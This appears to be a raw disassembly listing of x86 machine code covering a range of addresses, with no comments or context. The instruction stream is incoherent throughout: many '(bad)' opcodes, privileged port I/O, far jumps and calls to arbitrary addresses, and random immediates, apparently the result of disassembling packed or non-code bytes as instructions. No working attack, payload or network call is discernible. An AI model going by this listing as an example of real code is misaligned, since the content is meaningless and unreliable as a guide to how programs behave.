  4141dd:	sar    BYTE PTR [edi-0x18],1
  4141e0:	ins    DWORD PTR es:[edi],dx
  4141e1:	mov    bh,0x5d
  4141e3:	pusha  
  4141e4:	inc    ebp
  4141e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4141e6:	rcr    ebp,1
  4141e8:	pop    edx
  4141e9:	pop    ebx
  4141ea:	jae    0x4141f4
  4141ec:	mov    ebx,0x9658032
  4141f1:	mov    al,ds:0x369362de
  4141f6:	pop    edi
  4141f7:	ja     0x4141de
  4141f9:	scas   al,BYTE PTR es:[edi]
  4141fa:	repnz cmp bh,bl
  4141fd:	adc    ah,BYTE PTR [ebx]
  4141ff:	(bad)  
  414200:	jl     0x41424e
  414202:	xor    ah,BYTE PTR [edx-0x2d]
  414205:	fstp   QWORD PTR ds:0xe62cc2c
  41420b:	jle    0x41420a
  41420d:	lock push ebx
  41420f:	lods   eax,DWORD PTR ds:[esi]
  414210:	imul   esp,DWORD PTR [ebp-0xb400f5a],0xcda5ed52
  41421a:	jno    0x414283
  41421c:	pop    bp
  41421e:	fs ret 0x725b
  414222:	pop    ds
  414223:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414224:	ja     0x414205
  414226:	and    al,0xde
  414228:	ds mov esp,0x50b2c5d5
  41422e:	fwait
  41422f:	mov    esi,ds
  414231:	mov    ecx,0x67ad661a
  414236:	repnz fdivr st,st(0)
  414239:	jge    0x414210
  41423b:	call   0xd2d3d61c
  414240:	add    dh,dh
  414242:	retf   0x7a71
  414245:	cli    
  414246:	cwde   
  414247:	enter  0x8c83,0x9a
  41424b:	and    bl,BYTE PTR [ebx+0x6f]
  41424e:	pop    edi
  41424f:	ret    0x8a61
  414252:	lea    esp,[edx-0x175df4ef]
  414258:	daa    
  414259:	mov    ecx,0x67ebd46
  41425e:	(bad)  [ecx-0x479a5f31]
  414264:	inc    ebx
  414265:	jecxz  0x41427f
  414267:	es xor ebp,ecx
  41426a:	arpl   WORD PTR [ecx],cx
  41426c:	cli    
  41426d:	xchg   esi,eax
  41426e:	fwait
  41426f:	cwde   
  414270:	mov    al,ds:0x16ef1363
  414275:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414276:	out    dx,eax
  414277:	dec    eax
  414278:	outs   dx,BYTE PTR ds:[esi]
  414279:	or     BYTE PTR [ebp+0x1],bh
  41427c:	outs   dx,DWORD PTR ds:[esi]
  41427d:	pop    edi
  41427e:	pusha  
  41427f:	jo     0x414269
  414281:	gs das 
  414283:	loope  0x414262
  414285:	stos   DWORD PTR es:[edi],eax
  414286:	xor    esp,DWORD PTR [ebx]
  414288:	retf   
  414289:	(bad)  
  41428a:	and    bh,BYTE PTR [ecx-0x5d]
  41428d:	scas   al,BYTE PTR es:[edi]
  41428e:	sbb    ebp,DWORD PTR [edi]
  414290:	dec    ecx
  414291:	cmp    dl,0xb7
  414294:	repz cmp al,0x51
  414297:	adc    ch,BYTE PTR [ebp+0x7917c06]
  41429d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41429e:	loopne 0x4142a5
  4142a0:	es add al,0xd0
  4142a3:	ds push 0x58bc7c8b
  4142a9:	adc    DWORD PTR [edi],eax
  4142ab:	adc    al,0x2
  4142ad:	fdivr  DWORD PTR [edx-0x16]
  4142b0:	stc    
  4142b1:	lods   eax,DWORD PTR ds:[esi]
  4142b2:	push   ebp
  4142b3:	xlat   BYTE PTR ds:[ebx]
  4142b4:	(bad)  
  4142b6:	mov    dh,0x86
  4142b8:	dec    eax
  4142b9:	xor    al,0x34
  4142bb:	mov    esp,0x598aa93a
  4142c0:	or     BYTE PTR [eax-0x5f],cl
  4142c3:	jo     0x414276
  4142c5:	sar    BYTE PTR [ebp-0x8],cl
  4142c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4142c9:	aas    
  4142ca:	gs xor eax,0xec7bcd1
  4142d0:	enter  0x487d,0xc
  4142d4:	mov    cl,0x8
  4142d6:	sahf   
  4142d7:	and    al,0xa2
  4142d9:	inc    ebx
  4142da:	(bad)  [eax]
  4142dc:	jp     0x414312
  4142de:	xlat   BYTE PTR ds:[ebx]
  4142df:	(bad)
  4142e3:	out    dx,eax
  4142e4:	fidiv  WORD PTR [edx-0xf8446d3]
  4142ea:	loopne 0x414317
  4142ec:	ss loop 0x4142a5
  4142ef:	rol    edi,1
  4142f1:	pop    ss
  4142f2:	(bad)  [ebx]
  4142f4:	jnp    0x41433e
  4142f6:	(bad)  [ecx]
  4142f8:	inc    edx
  4142f9:	inc    edx
  4142fa:	push   ss
  4142fb:	jg     0x41432d
  4142fd:	mov    bh,0xc
  4142ff:	bound  ebp,QWORD PTR [eax]
  414301:	and    DWORD PTR [edx-0x14607abb],ebx
  414307:	sub    eax,0x20fce21d
  41430c:	or     bl,BYTE PTR [ecx-0x2f]
  41430f:	xchg   esp,eax
  414310:	mov    eax,ds:0xa5f4f13a
  414315:	out    dx,eax
  414316:	cmp    ecx,ebp
  414318:	in     eax,0xe4
  41431a:	sub    eax,0xaf0dc38e
  41431f:	jl     0x41439b
  414321:	xchg   ebp,eax
  414322:	cwde   
  414323:	mov    ds:0xb67d8,eax
  414328:	push   ebp
  414329:	pop    ds
  41432a:	xchg   BYTE PTR [ebx+ebx*8],bl
  41432d:	jbe    0x4142d6
  41432f:	xor    al,0xa7
  414331:	dec    edi
  414332:	xchg   ebx,eax
  414333:	outs   dx,DWORD PTR ds:[esi]
  414334:	pop    ecx
  414335:	hlt    
  414336:	xor    al,0x44
  414338:	xchg   esp,eax
  414339:	dec    ecx
  41433a:	mov    cl,0x21
  41433c:	dec    edi
  41433d:	dec    esp
  41433e:	inc    eax
  41433f:	pusha  
  414340:	sti    
  414341:	fsubr  QWORD PTR [edi-0x2d552c1]
  414347:	sub    al,0xcb
  414349:	aam    0xb0
  41434b:	inc    edx
  41434c:	dec    ecx
  41434d:	cdq    
  41434e:	cli    
  41434f:	fild   WORD PTR ds:0x9fed9dce
  414355:	dec    ebx
  414356:	fadd   DWORD PTR [edi-0x2c]
  414359:	loope  0x4142ec
  41435b:	ret    
  41435c:	das    
  41435d:	dec    esp
  41435e:	or     esi,DWORD PTR [esi]
  414360:	pop    esi
  414361:	jecxz  0x414324
  414363:	or     eax,0x66053ff3
  414368:	ja     0x414373
  41436a:	pop    eax
  41436b:	loope  0x4143cd
  41436d:	mov    esi,DWORD PTR [esi]
  41436f:	push   eax
  414370:	mov    esp,0x8fdce268
  414375:	in     eax,0xa1
  414377:	popa   
  414378:	mov    ebx,0x1a92b689
  41437d:	mov    ebp,0xfb0cbbd2
  414382:	jns    0x414369
  414384:	mov    bh,0xb9
  414386:	xchg   edi,eax
  414387:	xchg   ecx,eax
  414388:	popa   
  414389:	pop    edi
  41438a:	mov    ecx,0xe96c1646
  41438f:	outs   dx,DWORD PTR ds:[esi]
  414390:	(bad)  
  414391:	outs   dx,DWORD PTR ds:[esi]
  414392:	add    eax,0xaf01d242
  414397:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414398:	xchg   ecx,eax
  414399:	ret    
  41439a:	rol    eax,0xb3
  41439d:	xchg   edi,eax
  41439e:	jg     0x4143f1
  4143a0:	xchg   ecx,eax
  4143a1:	mov    bl,0x71
  4143a3:	out    dx,al
  4143a4:	aaa    
  4143a5:	xchg   esp,eax
  4143a6:	xor    al,0x61
  4143a8:	aas    
  4143a9:	js     0x4143e9
  4143ab:	lock in al,dx
  4143ad:	ret    
  4143ae:	add    eax,0xb46c7d24
  4143b3:	mov    BYTE PTR [eax],0x6b
  4143b6:	dec    edi
  4143b7:	xor    DWORD PTR [eax-0x42732dec],0x7d
  4143be:	xlat   BYTE PTR ds:[ebx]
  4143bf:	sbb    DWORD PTR [esi-0x1e],edi
  4143c2:	ins    BYTE PTR es:[edi],dx
  4143c3:	cs jns 0x4143a3
  4143c6:	test   BYTE PTR [edx],0x6
  4143c9:	mov    DWORD PTR [ecx+0x1f],esi
  4143cc:	(bad)  
  4143cd:	test   al,0x3e
  4143cf:	(bad)  [eax]
  4143d1:	push   ss
  4143d2:	and    BYTE PTR [edx],cl
  4143d4:	cmp    ecx,eax
  4143d6:	ror    edi,cl
  4143d8:	xlat   BYTE PTR ds:[ebx]
  4143d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4143da:	(bad)  [esp]
  4143dd:	sti    
  4143de:	out    0xd1,eax
  4143e0:	jecxz  0x4143be
  4143e2:	push   esp
  4143e3:	mov    eax,0x59f55d44
  4143e8:	(bad)  
  4143eb:	in     al,dx
  4143ec:	inc    ebx
  4143ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4143ee:	push   esi
  4143ef:	mov    edx,0xabcecf8
  4143f4:	xor    eax,0x6e3adb0b
  4143f9:	addr16 int 0x8e
  4143fc:	add    cl,BYTE PTR [ebx*4-0x661f423e]
  414403:	cmp    al,0x23
  414405:	ror    BYTE PTR [ebp+0x1f66fff5],1
  41440b:	dec    ecx
  41440c:	outs   dx,DWORD PTR ds:[esi]
  41440d:	fidivr DWORD PTR [ebp+0x2bd5b131]
  414413:	out    dx,eax
  414414:	out    dx,al
  414415:	shl    BYTE PTR [edi+0x4b3e8028],1
  41441b:	out    0x65,eax
  41441d:	(bad)  
  41441e:	mov    ah,0xac
  414420:	inc    ecx
  414421:	es inc ebp
  414423:	pop    eax
  414424:	call   0x6e26:0x3d4a6820
  41442b:	and    ah,ah
  41442d:	inc    DWORD PTR [esp+ecx*2+0x2d7e8362]
  414434:	pop    esi
  414435:	out    0xba,eax
  414437:	push   0xdb21ebaf
  41443c:	mov    eax,ds:0x9f11498c
  414441:	mov    ch,0x5d
  414443:	and    DWORD PTR ds:0x39e9f87e,ecx
  414449:	inc    ebx
  41444a:	rcl    DWORD PTR [edx],cl
  41444c:	dec    ebx
  41444d:	mov    bl,BYTE PTR [ecx]
  41444f:	lea    eax,[edi]
  414451:	je     0x41448b
  414453:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414454:	scas   eax,DWORD PTR es:[edi]
  414455:	loop   0x4144ac
  414457:	adc    ah,BYTE PTR [edi-0x255bc585]
  41445d:	and    dh,BYTE PTR [ebx]
  41445f:	outs   dx,DWORD PTR ds:[esi]
  414460:	dec    edi
  414461:	jmp    0x321b:0xcaa67d8d
  414468:	test   BYTE PTR [ebp-0x3c],0x3e
  41446c:	add    DWORD PTR [ecx],ecx
  41446e:	pushf  
  41446f:	push   0x21b620c3
  414474:	sbb    ecx,DWORD PTR [esi]
  414476:	cmp    al,0xa
  414478:	into   
  414479:	add    al,0x22
  41447b:	fnsave [esi+ebp*1]
  41447e:	sub    BYTE PTR [esi-0x6f1826b2],dl
  414484:	add    edx,DWORD PTR [esp+edx*4+0x41ca4111]
  41448b:	aad    0x91
  41448d:	scas   al,BYTE PTR es:[edi]
  41448e:	and    DWORD PTR [esi+0x12],esi
  414491:	inc    esp
  414492:	(bad)  
  414493:	mov    eax,fs:0x8c57450c
  414499:	cmp    edi,DWORD PTR ds:0x9fa0d312
  41449f:	inc    esi
  4144a0:	mov    DWORD PTR [ebp+ebp*2+0x4da58e36],edi
  4144a7:	inc    edi
  4144a8:	mov    dl,0x51
  4144aa:	xor    al,0xbe
  4144ac:	in     al,0xbd
  4144ae:	jp     0x4144af
  4144b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4144b1:	pop    ss
  4144b2:	or     BYTE PTR [edx+0x7f86fa1d],bl
  4144b8:	xor    esi,edi
  4144ba:	dec    esp
  4144bb:	add    al,0x9c
  4144bd:	call   0x68a1:0x1b0d816d
  4144c4:	adc    bl,BYTE PTR [esi]
  4144c6:	aad    0xa9
  4144c8:	sub    al,0x9c
  4144ca:	adc    DWORD PTR [eax+ecx*4-0x4c],edi
  4144ce:	fisubr DWORD PTR [eax]
  4144d0:	mov    ebp,0x16e1a1a0
  4144d5:	scas   eax,DWORD PTR es:[edi]
  4144d6:	jbe    0x4144d2
  4144d8:	jae    0x414558
  4144da:	inc    ebx
  4144db:	mov    al,0x42
  4144dd:	sub    BYTE PTR [eax+ebp*1+0x40f3fcfe],dh
  4144e4:	dec    edi
  4144e5:	jae    0x4144ff
  4144e7:	fcmovnbe st,st(2)
  4144e9:	stos   BYTE PTR es:[edi],al
  4144ea:	retf   0x77fa
  4144ed:	mov    ebx,0x60dcb467
  4144f2:	xlat   BYTE PTR ds:[ebx]
  4144f3:	jmp    0x1231fa04
  4144f8:	sbb    BYTE PTR [ebx],ah
  4144fa:	push   edi
  4144fb:	das    
  4144fc:	enter  0x902c,0x75
  414500:	push   ebp
  414501:	(bad)  
  414502:	mov    dh,0xe1
  414504:	fst    DWORD PTR [eax-0x2d943f05]
  41450a:	pop    ds
  41450b:	or     esp,edx
  41450d:	sbb    BYTE PTR [esi-0xf],al
  414510:	sbb    dl,bl
  414512:	cmp    DWORD PTR [esi-0x35ae88e2],0x38
  414519:	and    al,0xaa
  41451b:	jg     0x4144e3
  41451d:	jge    0x41453d
  41451f:	xor    al,0x14
  414521:	ja     0x41456b
  414523:	xor    bl,BYTE PTR [ecx]
  414525:	mov    esi,fs
  414527:	and    edx,edi
  414529:	or     ecx,esi
  41452b:	cmp    al,0x50
  41452d:	push   ebp
  41452e:	inc    esi
  41452f:	leave  
  414530:	lock mov ebp,0x2321e173
  414536:	mov    edi,0xfbfd069
  41453b:	mov    dl,0xb8
  41453d:	mov    al,ds:0xa36529df
  414542:	xchg   edx,eax
  414543:	mov    al,ds:0x9a57ce1b
  414548:	or     ecx,ebx
  41454a:	mov    dh,0x34
  41454c:	lods   eax,DWORD PTR ds:[esi]
  41454d:	jl     0x4144e3
  41454f:	pop    eax
  414550:	cmc    
  414551:	jmp    0xd8fc6107
  414556:	loopne 0x4145b2
  414558:	mov    ah,0x74
  41455a:	and    ch,cl
  41455c:	sub    al,0x1c
  41455e:	rcl    DWORD PTR [eax+0xb],cl
  414561:	mov    ebx,DWORD PTR [ecx+0x55ab9837]
  414567:	es cmp edx,eax
  41456a:	stos   BYTE PTR es:[edi],al
  41456b:	fwait
  41456c:	push   eax
  41456d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41456e:	jb     0x414554
  414570:	mov    edi,0x5f09f6c8
  414575:	jg     0x41452a
  414577:	push   ebx
  414578:	rcr    eax,0x57
  41457b:	push   cs
  41457c:	out    0x72,al
  41457e:	sbb    BYTE PTR [ebp+0x1],0x5f
  414582:	retf   0x7cb1
  414585:	sub    al,0x83
  414587:	or     eax,0xc3272098
  41458c:	mov    WORD PTR [edx-0x62b7dd27],ss
  414592:	jge    0x4145d2
  414594:	leave  
  414595:	ja     0x4145e3
  414597:	push   ds
  414598:	and    DWORD PTR [ebp-0x37],ebx
  41459b:	push   ecx
  41459c:	pop    ecx
  41459d:	jbe    0x414602
  41459f:	add    eax,ebp
  4145a1:	iret   
  4145a2:	mov    dl,0x35
  4145a4:	call   0x5f7f0406
  4145a9:	add    esp,DWORD PTR [esi]
  4145ab:	fdiv   QWORD PTR [edx+ecx*8+0x7edca4c6]
  4145b2:	or     ebp,0x35b402e4
  4145b8:	rcr    BYTE PTR [ebp-0x6dc3ac10],0xa
  4145bf:	sub    bl,bl
  4145c1:	in     al,dx
  4145c2:	stc    
  4145c3:	out    0xfe,eax
  4145c5:	scas   eax,DWORD PTR es:[edi]
  4145c6:	outs   dx,DWORD PTR ds:[esi]
  4145c7:	xchg   esp,ecx
  4145c9:	mov    esp,0x5e5ed3bc
  4145ce:	aas    
  4145cf:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  4145d1:	pop    edx
  4145d2:	pop    ebx
  4145d3:	push   eax
  4145d4:	fbld   TBYTE PTR [ebx+0x3ff3c927]
  4145da:	mov    ebp,0x3ea3c197
  4145df:	push   ebp
  4145e0:	xor    esp,DWORD PTR [ebx-0x2c]
  4145e3:	lods   al,BYTE PTR ds:[esi]
  4145e4:	stc    
  4145e5:	inc    esp
  4145e6:	sbb    DWORD PTR [ecx],ebp
  4145e8:	or     ebp,DWORD PTR [ecx+0xb9bb63f]
  4145ee:	ins    DWORD PTR es:[edi],dx
  4145ef:	cli    
  4145f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4145f1:	cmp    DWORD PTR ds:0xaf2df136,eax
  4145f7:	aaa    
  4145f8:	out    dx,al
  4145f9:	dec    esp
  4145fa:	test   eax,0x53f4d8f8
  4145ff:	inc    ecx
  414600:	mov    BYTE PTR [eax+0x4b],ch
  414603:	les    ebp,FWORD PTR [ecx+0x6e]
  414606:	aad    0xa
  414608:	push   ebp
  414609:	ins    BYTE PTR es:[edi],dx
  41460a:	dec    ecx
  41460c:	aaa    
  41460d:	cmp    ecx,edx
  41460f:	xor    DWORD PTR [esi-0x72],ebp
  414612:	mov    al,0x4e
  414614:	loopne 0x414606
  414616:	mov    bh,0x7
  414618:	shl    ebx,0x50
  41461b:	dec    ebx
  41461c:	(bad)  
  41461d:	aad    0x22
  41461f:	imul   dl
  414621:	xor    al,0xe1
  414623:	pop    ecx
  414624:	(bad)  
  414625:	(bad)  
  414626:	mov    eax,0xeee4ba86
  41462b:	fimul  DWORD PTR [ecx-0x47]
  41462e:	ror    DWORD PTR [esi],0x58
  414631:	xlat   BYTE PTR ds:[ebx]
  414632:	shl    BYTE PTR [edx-0x41e7b535],0xef
  414639:	jge    0x41466a
  41463b:	pop    eax
  41463c:	push   esp
  41463d:	rcr    BYTE PTR [edi+0x68],1
  414640:	lock stos BYTE PTR es:[edi],al
  414642:	lods   eax,DWORD PTR ds:[esi]
  414643:	sub    al,0x6c
  414645:	add    ecx,esp
  414647:	in     al,dx
  414648:	mov    ch,0xef
  41464a:	pusha  
  41464b:	jp     0x4146a7
  41464d:	ss dec edi
  41464f:	mov    edx,?
  414651:	and    al,0xbb
  414653:	mov    dh,BYTE PTR [ebx+ecx*2+0x3b]
  414657:	push   ebx
  414658:	and    al,0xb4
  41465a:	mov    eax,0xc471a46d
  41465f:	fadd   DWORD PTR [edx+0x2406fc0f]
  414665:	mov    esi,0x53055947
  41466a:	jg     0x41468f
  41466c:	sbb    eax,0x4b39b410
  414671:	ins    BYTE PTR es:[edi],dx
  414672:	aaa    
  414673:	mov    ebp,0x71f8b5d1
  414678:	fisub  DWORD PTR [esi-0x16]
  41467b:	and    al,0xb1
  41467d:	int    0xbb
  41467f:	popa   
  414680:	mov    ebx,0x3e582fad
  414685:	pop    edi
  414686:	cmp    BYTE PTR [ecx+0x4c],0xe7
  41468a:	loop   0x4146fc
  41468c:	adc    ah,0x34
  41468f:	jbe    0x41468b
  414691:	adc    DWORD PTR [eax+ebx*1+0x43ff1a7a],edi
  414698:	pop    ds
  414699:	(bad)  
  41469b:	call   0x698baba2
  4146a0:	lea    ebp,[ebx]
  4146a2:	pop    eax
  4146a3:	push   ebx
  4146a4:	test   BYTE PTR [esi-0x7fb8f04a],al
  4146aa:	and    DWORD PTR [esi+eax*8-0x1e41f723],0xaaac4063
  4146b5:	call   0xcef115a7
  4146ba:	test   BYTE PTR [edx-0x6cc46e45],bl
  4146c0:	xor    eax,0xf73c8f9f
  4146c5:	inc    ebx
  4146c6:	xchg   ebp,eax
  4146c7:	add    DWORD PTR [edx+0x5a],ebx
  4146ca:	std    
  4146cb:	or     eax,0x19422963
  4146d0:	and    eax,edi
  4146d2:	jnp    0x4146de
  4146d4:	mov    BYTE PTR [edx+0x44],bh
  4146d7:	adc    edx,DWORD PTR [edx+eiz*1-0x48]
  4146db:	xlat   BYTE PTR ds:[ebx]
  4146dc:	iret   
  4146dd:	cmp    DWORD PTR [ebx+0x29bb593c],ebx
  4146e3:	lods   eax,DWORD PTR ds:[esi]
  4146e4:	inc    esp
  4146e5:	pop    ss
  4146e6:	mov    ebp,0x46f0240f
  4146eb:	call   DWORD PTR [ebx]
  4146ed:	lock clc 
  4146ef:	pusha  
  4146f0:	in     eax,dx
  4146f1:	sbb    bh,al
  4146f3:	cmp    al,0xe5
  4146f5:	mov    dl,BYTE PTR [esp+ecx*8]
  4146f8:	lods   eax,DWORD PTR ds:[esi]
  4146f9:	mov    bh,0x4b
  4146fb:	dec    eax
  4146fc:	dec    edi
  4146fd:	jge    0x4146ee
  4146ff:	div    BYTE PTR [ebx-0xc91e6e5]
  414705:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  414707:	ret    0xe7c3
  41470a:	add    BYTE PTR [eax],ah
  41470c:	mov    eax,ds:0xb320d5bc
  414711:	and    BYTE PTR [edx+0x1d54fdc5],dl
  414717:	dec    edx
  414718:	and    BYTE PTR [ebp-0x22ed01e7],dh
  41471e:	xor    bh,cl
  414720:	and    BYTE PTR ds:0x2cc90f9e,ch
  414726:	jne    0x41474e
  414728:	daa    
  414729:	sub    al,0x73
  41472b:	bswap  edx
  41472d:	call   0x1bb8e03e
  414732:	jmp    0x6008:0x5fec1de5
  414739:	into   
  41473a:	bound  edi,QWORD PTR [ecx-0x521aaddc]
  414740:	cmp    BYTE PTR [eax],bl
  414742:	mov    ch,0x6
  414744:	sbb    eax,0x4c44d95d
  414749:	pop    ebx
  41474a:	mov    ds,WORD PTR [ebp-0x80]
  41474d:	sub    al,0xda
  41474f:	xchg   edi,eax
  414750:	aam    0x44
  414752:	jg     0x41474d
  414754:	push   esi
  414755:	or     al,0xfa
  414757:	jae    0x4147ca
  414759:	(bad)  
  41475a:	jmp    0xde4c059c
  41475f:	xchg   ebx,eax
  414760:	lahf   
  414761:	test   eax,0x3e16f02c
  414766:	aam    0x3b
  414768:	rcr    DWORD PTR [edi-0x7408fa8d],cl
  41476e:	mov    dh,0x14
  414770:	jecxz  0x4147bd
  414772:	in     eax,dx
  414773:	adc    al,0x30
  414775:	ss or  ah,bl
  414778:	out    0x7f,al
  41477a:	push   ecx
  41477b:	cs arpl cx,ax
  41477e:	jle    0x41478e
  414780:	sti    
  414781:	ds xor al,0x50
  414784:	cmp    al,0xe1
  414786:	lock loopne 0x414734
  414789:	lea    ebp,[ebx]
  41478b:	jo     0x4147ee
  41478d:	out    dx,al
  41478e:	add    eax,0xb618d9d5
  414793:	sub    DWORD PTR [eax+0x16870778],edx
  414799:	retf   0x8884
  41479c:	cld    
  41479d:	sbb    ah,dl
  41479f:	aas    
  4147a0:	rol    esi,cl
  4147a2:	out    dx,al
  4147a3:	mov    eax,ds:0x173f3c49
  4147a8:	mov    eax,0x2841dd76
  4147ad:	sub    eax,DWORD PTR [edi]
  4147af:	fisubr DWORD PTR [esi]
  4147b1:	call   FWORD PTR [edi+0x6cf668ff]
  4147b7:	or     bl,ah
  4147b9:	ret    
  4147ba:	sbb    dh,BYTE PTR [ebx+0x3f9dc809]
  4147c0:	out    dx,al
  4147c1:	push   eax
  4147c2:	and    esi,DWORD PTR ds:0x6f6ce28d
  4147c8:	xor    ecx,0x5da2d9dc
  4147ce:	mov    WORD PTR [ebx+0x5d59ca6e],ds
  4147d4:	cli    
  4147d5:	retf   0x762a
  4147d8:	xchg   ebx,eax
  4147d9:	adc    BYTE PTR [edx-0x29],al
  4147dc:	xchg   esi,eax
  4147dd:	outs   dx,DWORD PTR ds:[esi]
  4147de:	in     eax,0xa5
  4147e0:	repnz mov al,ds:0x6e504c10
  4147e6:	not    DWORD PTR [eax-0x2dfc56ce]
  4147ec:	rcr    DWORD PTR [ecx+0x7d],cl
  4147ef:	mov    bh,bh
  4147f1:	push   0x29
  4147f3:	neg    DWORD PTR [ecx-0x15]
  4147f6:	sbb    bl,BYTE PTR [ebx-0x34]
  4147f9:	inc    edx
  4147fa:	(bad)  
  4147fb:	rcl    al,cl
  4147fd:	and    BYTE PTR [esi],bl
  4147ff:	out    0x4,al
  414801:	sub    BYTE PTR [edx],dl
  414803:	fistp  WORD PTR [ebp+0x24]
  414806:	shl    DWORD PTR [ebp-0x767d1904],0x78
  41480d:	add    DWORD PTR ds:0xa1a8c810,esi
  414813:	add    al,0x78
  414815:	pushw  ds
  414817:	or     al,0xe
  414819:	ffree  st(5)
  41481b:	sbb    DWORD PTR [ebp+0x18c3bc4c],eax
  414821:	in     eax,dx
  414822:	dec    ecx
  414823:	cmp    DWORD PTR [ecx],eax
  414825:	icebp  
  414826:	jbe    0x41483d
  414828:	sub    DWORD PTR [edi],0x53
  41482b:	nop
  41482c:	(bad)
  41482f:	mov    edi,DWORD PTR [eax+ebp*4+0x71b06778]
  414836:	stc    
  414837:	pop    edx
  414838:	jp     0x4147fe
  41483a:	or     ch,BYTE PTR [ebx+0x57fd414c]
  414840:	call   0xfc2f:0x50ef58ed
  414847:	push   0x28
  414849:	jbe    0x4148b6
  41484b:	lock and ebp,esi
  41484e:	add    cl,ah
  414850:	xchg   ebx,esp
  414852:	inc    ebx
  414853:	xor    ah,BYTE PTR [esi-0x13]
  414856:	cmp    edx,DWORD PTR [ebp+0x553b6946]
  41485c:	inc    ecx
  41485d:	(bad)  
  41485e:	sbb    al,0x1a
  414860:	pop    esp
  414861:	and    al,0x4b
  414863:	cmp    ebx,DWORD PTR ds:0x16c869d4
  414869:	call   0x9f041d60
  41486e:	cs push eax
  414870:	mov    bl,0x9c
  414872:	ficom  WORD PTR [ebp-0x26f44044]
  414878:	dec    esi
  414879:	ins    DWORD PTR es:[edi],dx
  41487a:	push   edx
  41487c:	sbb    esp,ecx
  41487e:	out    0xe1,al
  414880:	dec    edx
  414881:	jmp    0xb233:0xc3739443
  414888:	xchg   cl,cl
  41488a:	(bad)  
  41488b:	into   
  41488c:	pop    ss
  41488d:	cmp    eax,0x6b3d584a
  414892:	imul   ecx,DWORD PTR [esi+esi*4+0xa9f105a],0xbde9b685
  41489d:	cmp    DWORD PTR [ebx+0xbe61fba],edi
  4148a3:	das    
  4148a4:	push   ebx
  4148a5:	mov    ds,WORD PTR [eax-0x56]
  4148a8:	rcl    eax,1
  4148aa:	jne    0x4148e8
  4148ac:	jno    0x4148b0
  4148ae:	sub    dh,bl
  4148b0:	(bad)  [ebx+0x1e]
  4148b3:	xlat   BYTE PTR ds:[ebx]
  4148b4:	ret    0xa023
  4148b7:	popf   
  4148b8:	mov    ?,WORD PTR [edi]
  4148ba:	xchg   ebx,eax
  4148bb:	stc    
  4148bc:	xchg   DWORD PTR [ebp+0x313f0413],esp
  4148c2:	nop
  4148c3:	mov    edx,0x584467f8
  4148c8:	adc    BYTE PTR [edi],cl
  4148ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4148cb:	and    al,0x89
  4148cd:	add    eax,0xc0b9b714
  4148d2:	pop    ecx
  4148d3:	and    edx,DWORD PTR [esi+eiz*1+0x737e7d89]
  4148da:	not    BYTE PTR [eax]
  4148dc:	cld    
  4148dd:	repz bound eax,QWORD PTR [ebp+ebp*8+0x24127fb3]
  4148e5:	jne    0x414905
  4148e7:	(bad)  
  4148e8:	sub    ah,ah
  4148ea:	ror    DWORD PTR [eax+edx*8],cl
  4148ed:	in     ax,dx
  4148ef:	sar    bl,cl
  4148f1:	cmc    
  4148f2:	mov    eax,ds:0xc14844fd
  4148f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4148f8:	not    BYTE PTR [ebx-0x2282a5b8]
  4148fe:	mov    bl,BYTE PTR gs:[edi+ebp*8]
  414902:	iret   
  414903:	sbb    eax,DWORD PTR [edx]
  414905:	shr    BYTE PTR [esi-0x2ccf2746],1
  41490b:	popa   
  41490c:	adc    al,0x8
  41490e:	(bad)
  414911:	out    dx,eax
  414912:	pop    es
  414913:	xor    BYTE PTR [ecx],0x9
  414916:	jns    0x4148f2
  414918:	repz push eax
  41491a:	inc    ecx
  41491b:	in     al,dx
  41491c:	dec    esp
  41491d:	dec    ebx
  41491e:	pop    edi
  41491f:	mov    ds:0x6adad11,al
  414924:	mov    ah,0xa8
  414926:	mov    ss,WORD PTR [edx-0x7b]
  414929:	sub    DWORD PTR [eax],esi
  41492b:	iret   
  41492c:	cmp    dl,BYTE PTR [ebx+0x58]
  41492f:	sub    al,0x1c
  414931:	out    dx,eax
  414932:	pop    ebx
  414933:	fwait
  414934:	cmp    eax,0x8100efd5
  414939:	sub    eax,0xdaaf56ab
  41493e:	mov    ch,0x18
  414940:	push   ecx
  414941:	fld    TBYTE PTR [edi+0x64]
  414944:	das    
  414945:	push   es
  414946:	test   BYTE PTR [eax],al
  414948:	mov    ds,WORD PTR [edi-0x31]
  41494b:	pushf  
  41494c:	pop    eax
  41494d:	pop    esp
  41494e:	push   esp
  41494f:	inc    ebp
  414950:	and    DWORD PTR [ebp-0x43c9ba06],0x504e704f
  41495a:	cli    
  41495b:	mov    bl,0xcd
  41495d:	push   es
  41495e:	outs   dx,BYTE PTR ds:[esi]
  41495f:	iret   
  414960:	mov    ds:0x7926903d,al
  414965:	imul   esp,ecx,0x1d4fbfd3
  41496b:	lock dec ebx
  41496d:	mov    ds:0xea0c9f6,al
  414972:	test   DWORD PTR [eax+0x40bee6d4],ebx
  414978:	inc    ebp
  414979:	xchg   ebp,eax
  41497a:	psrad  mm3,QWORD PTR [ebx-0x25]
  41497e:	xor    esp,DWORD PTR [edx-0xf]
  414981:	test   DWORD PTR [esi+0x21],ebx
  414984:	and    BYTE PTR [eax+0x0],cl
  414987:	adc    BYTE PTR [bx-0x78],dh
  41498b:	pop    ss
  41498c:	call   0xb042:0xb0bbc74
  414993:	imul   ecx,DWORD PTR es:[esi+0x5fd7e53b],0xb
  41499b:	sbb    al,ah
  41499d:	xor    DWORD PTR [ebx-0x752e9def],edi
  4149a3:	scas   al,BYTE PTR es:[edi]
  4149a4:	bound  ecx,QWORD PTR [esi]
  4149a6:	xchg   ebx,eax
  4149a7:	pop    edi
  4149a8:	xor    ch,dh
  4149aa:	inc    edx
  4149ab:	push   ebx
